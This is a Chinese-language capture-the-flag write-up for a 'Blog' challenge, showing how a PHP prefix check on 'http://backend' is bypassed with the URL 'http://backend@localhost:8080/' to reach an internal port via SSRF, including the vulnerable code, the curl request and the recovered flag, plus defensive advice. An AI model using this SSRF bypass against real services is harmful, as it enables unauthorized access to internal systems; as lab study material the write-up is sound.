# Blog

## 题目简述

网页通过 `/blog.php?blog=<值>` 获取文章。前端 PHP 本应只向名为 `backend` 的内部服务发起请求，却用字符串前缀判断目标地址。利用 URL 中的 userinfo 语法可以绕过该判断，让 cURL 实际访问前端容器自身的 8080 端口，读取未对外暴露的秘密页面。

## 解题过程

### 确认服务端请求

正常文章请求形如：

```http
GET /blog.php?blog=1 HTTP/1.1
Host: target
```

传入完整 URL 时，响应会提示请求只能发往 `backend`。源码中的调试分支如下：

```php
if (str_starts_with($_GET['blog'], 'http://')) {
    if (!str_starts_with($_GET['blog'], 'http://backend')) {
        header('HTTP/1.1 403 Unauthorized');
        die("Request should only be sent to backend host.");
    }
    $url = $_GET['blog'];
} else {
    $url = "backend/" . $_GET['blog'];
}

curl_setopt($ch, CURLOPT_URL, $url);
echo curl_exec($ch);
```

这里仅检查原始字符串是否以 `http://backend` 开头，没有解析并核对最终主机名。

### 用 userinfo 绕过主机检查

标准 URL 可以写成：

```text
http://userinfo@hostname:port/path
```

因此：

```text
http://backend@localhost:8080/
```

在字符串层面以 `http://backend` 开头，能够通过过滤；但 cURL 将 `backend` 解释为 userinfo，真正连接的主机是 `localhost`，端口是 `8080`。

Docker 配置表明，前端容器中的 Apache 同时监听两个端口：

- 80 端口的文档根目录为 `/var/www/html`，对外提供博客；
- 8080 端口的文档根目录为 `/var/www/internal`，没有映射到宿主机。

利用 SSRF 访问该内部虚拟主机：

```bash
curl --get \
  --data-urlencode 'blog=http://backend@localhost:8080/' \
  'http://target/blog.php'
```

响应中的内部页面直接包含：

```text
N0PS{S5rF_1s_Th3_n3W_W4y}
```

## 方法总结

本题的漏洞由“字符串前缀校验”和“URL 解析语义”不一致造成。`backend@localhost` 看似仍以允许的主机名开头，但 `@` 会把前半段变成 userinfo。结合容器内只监听本地的 8080 虚拟主机，即可通过 SSRF 越过网络暴露边界。防御时应使用 URL 解析器取得规范化后的 hostname、port 和解析 IP，再执行白名单校验，同时限制重定向和内网地址。
